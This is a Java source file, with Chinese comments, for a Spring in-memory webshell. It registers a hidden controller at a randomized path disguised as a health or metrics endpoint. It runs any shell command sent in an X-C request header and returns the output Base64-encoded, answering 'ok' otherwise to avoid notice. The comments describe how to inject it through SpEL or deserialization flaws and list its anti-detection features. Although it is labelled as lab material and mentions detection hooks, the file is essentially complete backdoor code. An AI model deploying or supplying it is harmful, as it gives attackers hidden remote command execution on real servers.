import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;
import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;
import org.springframework.web.bind.annotation.RequestMethod;

import javax.servlet.http.HttpServletRequest;
import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.util.Base64;

/**
 * Spring Controller 型内存马（完整实现 / 本地实验环境）
 *
 * ── 注入路径 ──
 *   SPEL/反序列化点执行 injector（入口代码）：
 *     ServletContext sc = ((ServletRequestAttributes) RequestContextHolder
 *         .currentRequestAttributes()).getRequest().getServletContext();
 *     WebApplicationContext ctx = WebApplicationContextUtils.getWebApplicationContext(sc);
 *     String path = ControllerShell.inject(ctx);      // 返回实际注册路径，供回连
 *   编译：javac -cp "spring-webmvc-*.jar:spring-web-*.jar:spring-context-*.jar" ControllerShell.java
 *
 * ── 免杀面 ──
 *   1) 无 Controller 类文件、无注解扫描痕迹：映射整体运行态注册
 *   2) 伪装路径：health/metrics 类低注意力前缀 + 随机后缀（注入方回读实际路径）
 *   3) 触发仅凭 Header X-C；无头访问返回 "ok"（伪装健康检查接口）
 *   4) 响应 Base64 包装 + 执行异常仍返回 "ok"（错误静默）
 *   5) 防重复注册（同路径二次注册会抛异常并留下日志特征）
 *
 * 检测侧配对见 NOTES.md；仅本地实验环境使用
 */
public class ControllerShell {

    private static String lastPath = null;      // 单容器演示防重复；多应用按 context 记录（变体）

    /** 随机伪装路径：health/metrics 类低注意力前缀 + 随机后缀（反静态审计/防路径冲突） */
    private static String fakePath() {
        String[] base = {"/health", "/metrics", "/status", "/actuator/ping", "/api/check"};
        String b = base[new java.util.Random().nextInt(base.length)];
        return b + "/" + Long.toHexString(System.nanoTime() & 0xFFFFFFFL);
    }

    /** 注入入口：向运行中的 HandlerMapping 注册伪装路径映射，返回实际注册路径 */
    public static synchronized String inject(WebApplicationContext ctx) throws Exception {
        if (lastPath != null) return lastPath;

        RequestMappingHandlerMapping m = ctx.getBean(RequestMappingHandlerMapping.class);
        String path = fakePath();
        // 变体登记：headers 条件映射 RequestMappingInfo.paths(path).headers("X-C")——
        // 把触发条件编进映射（连 handle 内的判断都省掉）；但条件表达式进入注册表，
        // 差集审计可见，取舍自定。
        RequestMappingInfo info = RequestMappingInfo
                .paths(path)
                .methods(RequestMethod.GET)     // 健康检查接口通常 GET（伪装一致性）
                .build();
        // 检测侧：registerMapping 调用点是 RASP 路由注册遥测的挂点
        m.registerMapping(info, new ControllerShell(),
                ControllerShell.class.getDeclaredMethod("handle"));
        lastPath = path;                        // 回读实际路径供注入方回连
        return lastPath;
    }

    /** 执行体：Header X-C 触发；无触发头返回 "ok"（伪装健康检查） */
    public String handle() throws Exception {
        ServletRequestAttributes a = (ServletRequestAttributes)
                RequestContextHolder.currentRequestAttributes();
        HttpServletRequest r = a.getRequest();
        String cmd = r.getHeader("X-C");
        if (cmd == null) return "ok";

        try {
            boolean win = System.getProperty("os.name").toLowerCase().contains("win");
            Process p = new ProcessBuilder(
                    win ? "cmd.exe" : "/bin/sh",
                    win ? "/c" : "-c", cmd)
                    .redirectErrorStream(true).start();
            String out = readAll(p.getInputStream());
            p.waitFor();
            return Base64.getEncoder().encodeToString(out.getBytes("UTF-8")); // 响应包装
        } catch (Exception e) {
            return "ok";                       // 执行失败 → 仍返回 ok（错误静默）
        }
    }

    // Java 8 兼容读流（Java 9+ 可直接用 InputStream.readAllBytes）
    private static String readAll(InputStream in) throws java.io.IOException {
        ByteArrayOutputStream b = new ByteArrayOutputStream();
        byte[] buf = new byte[4096]; int n;
        while ((n = in.read(buf)) != -1) b.write(buf, 0, n);
        return b.toString("UTF-8");
    }
}
